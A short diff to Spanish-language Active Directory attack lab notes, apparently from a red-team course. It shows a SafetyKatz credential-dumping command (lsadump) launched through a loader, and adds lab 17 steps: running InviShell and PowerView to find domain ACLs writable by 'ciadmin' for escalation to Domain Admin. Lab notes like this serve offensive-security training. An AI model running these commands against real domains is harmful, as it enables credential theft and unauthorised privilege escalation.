@@ -1294,5 +1294,9 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-
 ```
 
 *LO -17*
-	En este laboratorio vamos a busacar un equipo en el dominio donde tengamos permisos de escritura, y abusar de estos privilegios para acceder a ese equipo como *Domain Admin*
-	
+En este laboratorio vamos a buscar un equipo en el dominio donde tengamos permisos de escritura, y abusar de estos privilegios para acceder a ese equipo como *Domain Admin*
+
+Primero deberemos de ejecutar una *InviShell* y *PowerView*
+```shell
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+```
